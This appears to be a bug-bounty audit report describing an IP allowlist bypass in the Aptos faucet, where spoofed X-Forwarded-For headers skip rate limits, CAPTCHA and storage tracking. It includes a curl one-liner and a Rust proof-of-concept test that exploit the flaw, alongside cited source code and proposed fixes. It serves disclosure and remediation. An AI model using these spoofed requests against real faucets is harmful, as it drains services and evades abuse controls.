# Audit Report

## Title
IP Allowlist Bypass via Spoofed Proxy Headers in Aptos Faucet Service

## Summary
The Aptos faucet service uses the `poem::web::RealIp` extractor to determine client IP addresses from HTTP proxy headers (X-Forwarded-For, X-Real-IP, X-Forwarded-IP) without validating trusted proxy sources. An attacker can spoof these headers to impersonate an allowlisted IP address, completely bypassing all security controls including rate limiting, CAPTCHA verification, IP blocklists, and storage tracking.

## Finding Description

The faucet service implements an IP allowlist bypasser that grants privileged access to requests originating from specific IP ranges. [1](#0-0) 

This bypasser checks if the client's source IP is within configured allowlisted ranges. [2](#0-1) 

The critical vulnerability lies in how the source IP is determined. The faucet endpoints extract the client IP using `poem::web::RealIp`, which automatically parses HTTP proxy headers. [3](#0-2) 

The comments explicitly acknowledge that RealIp "takes into things like X-Forwarded-IP and X-Real-IP" - headers that are fully controlled by the client and can be trivially spoofed. [4](#0-3) 

When a bypasser approves a request, **all security checks are completely skipped**, including checkers and storage operations. [5](#0-4) 

Furthermore, bypassed requests skip the completion phase where storage tracking occurs. [6](#0-5) 

The server configuration shows no trusted proxy validation or header sanitization is configured in the Poem framework setup. [7](#0-6) 

**Attack Scenario:**
1. Attacker discovers an allowlisted IP range (e.g., `10.0.0.0/8` for internal infrastructure)
2. Attacker sends HTTP POST request to `/fund` endpoint with header: `X-Forwarded-For: 10.0.0.1`
3. RealIp extractor trusts the spoofed header and reports source IP as `10.0.0.1`
4. IpAllowlistBypasser sees the IP in allowlist range and grants bypass privileges
5. All checkers are skipped: rate limiting, CAPTCHA, IP blocklists, authentication tokens
6. Attacker receives unlimited faucet funds without any security controls

## Impact Explanation

This vulnerability qualifies as **High severity** under the Aptos bug bounty program for the following reasons:

1. **Complete Security Control Bypass**: All protective mechanisms are circumvented, including rate limiting, CAPTCHA verification, IP blocklists, magic headers, authentication tokens, and referer blocklists. [8](#0-7) 

2. **Significant Protocol Violation**: The bypass mechanism is designed as a privileged access control for authorized infrastructure. Spoofing it completely violates the faucet's security protocol and trust model.

3. **API Service Compromise**: The faucet API can be drained without limits or tracking, causing service unavailability and potential economic damage on testnets.

4. **No Audit Trail**: Bypassed requests skip storage tracking, making attack detection and forensics impossible.

While this affects the faucet service rather than core consensus, it represents a complete compromise of the service's security architecture.

## Likelihood Explanation

**Likelihood: VERY HIGH**

Exploitation requires only:
- Knowledge of an allowlisted IP range (may be public knowledge or easily guessable like RFC1918 ranges)
- Ability to send HTTP requests with custom headers (any HTTP client: curl, browser dev tools, programming libraries)
- No authentication, special privileges, or technical sophistication required

The attack is **trivial to execute**:
```bash
curl -X POST http://faucet-service/fund \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 10.0.0.1" \
  -d '{"address":"0x123..."}'
```

## Recommendation

**Immediate Fix**: Implement trusted proxy validation in the Poem framework configuration. The faucet should only trust proxy headers from known, trusted sources (e.g., authenticated load balancers).

**Implementation approach:**

1. **Use Poem's TrustedProxy middleware** or implement custom IP validation:
```rust
// In server/run.rs, add trusted proxy configuration
use poem::middleware::TrustedProxies;

let route = Route::new()
    .nest(&self.server_config.api_path_base, api_service)
    .with(TrustedProxies::new(vec![
        "10.0.0.0/8".parse().unwrap(),  // Internal LB range
        "172.16.0.0/12".parse().unwrap(),  // Trusted proxy range
    ]))
    .with(cors);
```

2. **Alternative: Use direct socket address** instead of proxy headers:
```rust
// Extract real IP from socket connection, not headers
let source_ip = remote_addr.ip();  // From TCP connection
```

3. **Add header validation logging** to detect spoofing attempts:
```rust
// Log mismatches between socket IP and proxy headers for security monitoring
if socket_ip != header_ip {
    warn!("Potential header spoofing detected: socket={}, header={}", socket_ip, header_ip);
}
```

4. **Configuration-based trusted proxy list** in faucet YAML config:
```yaml
server_config:
  trusted_proxies:
    - "10.0.0.0/8"
    - "172.16.0.0/12"
  fallback_to_socket_ip: true  # Use socket IP if no trusted proxy
```

## Proof of Concept

```rust
#[tokio::test]
async fn test_ip_allowlist_spoofing_vulnerability() -> Result<()> {
    // Setup: Create allowlist with 10.0.0.0/8 range
    make_ip_allowlist(&["10.0.0.0/8"])?;
    
    let config_content = r#"
server_config:
  listen_address: "127.0.0.1"
  listen_port: 8081
bypasser_configs:
  - type: IpAllowlist
    file: "/tmp/ip_allowlist.txt"
# ... rest of config
"#;
    
    let (port, _handle) = start_server(config_content).await?;
    
    // ATTACK: Spoof X-Forwarded-For header with allowlisted IP
    let response = reqwest::Client::new()
        .post(format!("http://127.0.0.1:{}/fund", port))
        .header("Content-Type", "application/json")
        .header("X-Forwarded-For", "10.0.0.1")  // Spoofed allowlisted IP
        .body(r#"{"address":"0xABC..."}"#)
        .send()
        .await?;
    
    // RESULT: Request succeeds, bypassing ALL security controls
    assert_eq!(response.status(), 200);
    
    // Verify bypass occurred by checking no rate limit is enforced
    // Make unlimited requests from same actual IP (127.0.0.1)
    for _ in 0..100 {
        let response = reqwest::Client::new()
            .post(format!("http://127.0.0.1:{}/fund", port))
            .header("X-Forwarded-For", "10.0.0.1")
            .body(r#"{"address":"0xDEF..."}"#)
            .send()
            .await?;
        assert_eq!(response.status(), 200);  // All succeed, no rate limiting!
    }
    
    Ok(())
}
```

**Notes:**
- This vulnerability is specific to the faucet service and does not affect core blockchain consensus, Move VM, or validator operations
- The impact is limited to faucet fund drainage and service availability
- Production deployments should implement trusted proxy validation or use authenticated alternatives (auth tokens, OAuth) instead of IP allowlisting for privileged access

### Citations

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L12-29)
```rust
pub struct IpAllowlistBypasser {
    manager: IpRangeManager,
}

impl IpAllowlistBypasser {
    pub fn new(config: IpRangeManagerConfig) -> Result<Self> {
        Ok(Self {
            manager: IpRangeManager::new(config)?,
        })
    }
}

#[async_trait]
impl BypasserTrait for IpAllowlistBypasser {
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
}
```

**File:** crates/aptos-faucet/core/src/bypasser/mod.rs (L17-24)
```rust
/// This trait defines something that checks whether a given request should
/// skip all the checkers and storage, for example an IP allowlist.
#[async_trait]
#[enum_dispatch]
pub trait BypasserTrait: Sync + Send + 'static {
    /// Returns true if the request should be allowed to bypass all checkers
    /// and storage.
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool>;
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L102-120)
```rust
    async fn fund(
        &self,
        fund_request: Json<FundRequest>,
        asset: poem_openapi::param::Query<Option<String>>,
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
        // Same thing, this uses FromRequest.
        header_map: &HeaderMap,
    ) -> poem::Result<Json<FundResponse>, AptosTapErrorResponse> {
        let txns = self
            .components
            .fund_inner(fund_request.0, source_ip, header_map, false, asset.0)
            .await?;
        Ok(Json(FundResponse {
            txn_hashes: get_hashes(&txns),
        }))
    }

```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-242)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };

        let receiver = match fund_request.receiver() {
            Some(receiver) => receiver,
            None => {
                return Err(AptosTapError::new(
                    "Account address, auth key, or pub key must be provided and valid".to_string(),
                    AptosTapErrorCode::InvalidRequest,
                ))
            },
        };

        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L244-259)
```rust
        // See if this request meets the criteria to bypass checkers / storage.
        for bypasser in &self.bypassers {
            if bypasser
                .request_can_bypass(checker_data.clone())
                .await
                .map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::BypasserError)
                })?
            {
                info!(
                    "Allowing request from {} to bypass checks / storage",
                    source_ip
                );
                return Ok((checker_data, true, permit));
            }
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L332-347)
```rust
        if !bypass {
            let response_is_500 = match &fund_result {
                Ok(_) => false,
                Err(e) => e.error_code.status().is_server_error(),
            };
            let complete_data = CompleteData {
                checker_data,
                txn_hashes: txn_hashes.clone(),
                response_is_500,
            };
            for checker in &self.checkers {
                checker.complete(complete_data.clone()).await.map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError)
                })?;
            }
        }
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L195-220)
```rust
        let listener = TcpListener::bind((
            self.server_config.listen_address.clone(),
            self.server_config.listen_port,
        ))
        .await?;
        let port = listener.local_addr()?.port();

        if let Some(tx) = port_tx {
            tx.send(port).map_err(|_| anyhow!("failed to send port"))?;
        }

        // Create a future for the API server.
        let api_server_future = Server::new_with_acceptor(TcpAcceptor::from_tokio(listener)?).run(
            Route::new()
                .nest(
                    &self.server_config.api_path_base,
                    Route::new()
                        .nest("", api_service)
                        .catch_all_error(convert_error),
                )
                .at("/spec.json", spec_json)
                .at("/spec.yaml", spec_yaml)
                .at("/mint", poem::post(mint.data(fund_api_components)))
                .with(cors)
                .around(middleware_log),
        );
```

**File:** crates/aptos-faucet/core/src/checkers/mod.rs (L80-107)
```rust
/// should only be used at config reading time.
#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(tag = "type")]
pub enum CheckerConfig {
    /// Requires that an auth token is included in the Authorization header.
    AuthToken(ListManagerConfig),

    /// Requires a legitimate Google ReCaptcha token.
    GoogleCaptcha(GoogleCaptchaCheckerConfig),

    /// Rejects requests if their IP is in a blocklisted IPrnage.
    IpBlocklist(IpRangeManagerConfig),

    /// Checkers whether a config-defined magic header kv is present.
    MagicHeader(MagicHeaderCheckerConfig),

    /// Basic in memory ratelimiter that allows a single successful request per IP.
    MemoryRatelimit(MemoryRatelimitCheckerConfig),

    /// Ratelimiter that uses Redis.
    RedisRatelimit(RedisRatelimitCheckerConfig),

    /// Rejects requests if their Referer is blocklisted.
    RefererBlocklist(ListManagerConfig),

    /// In-house captcha solution.
    TapCaptcha(TapCaptchaCheckerConfig),
}
```
